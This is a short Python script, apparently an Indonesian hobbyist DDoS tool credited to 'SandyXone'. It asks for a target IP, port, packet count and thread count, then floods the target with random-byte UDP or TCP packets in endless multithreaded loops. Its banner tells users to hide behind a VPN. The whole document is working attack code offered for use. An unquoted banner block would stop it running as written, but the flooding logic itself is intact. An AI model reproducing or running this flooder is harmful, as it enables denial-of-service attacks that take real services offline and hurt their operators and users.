#!/usr/bin/env python3
#Code by Sandy
import random
import socket
import threading

=======================================
     Created By: SandyXone
=======================================
JANGAN DI PAKE ABUSE YA SAYANG 
JANGAN LUPA PAKE VPN YA SAYANG
=======================================
ip = str(input(" Target Ip:"))
port = int(input(" Target Port:"))
choice = str(input(" UDP(y/n):"))
times = int(input(" Paket yang dikirim ke target:"))
threads = int(input(" Threads yang dikirim:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Tok..Tok..Tok..Ada Paket Dari SandyXone Nih!!!")
		except:
			print("[!] Tolol!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Sent!!!")
		except:
			s.close()
			print("[*] Error")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()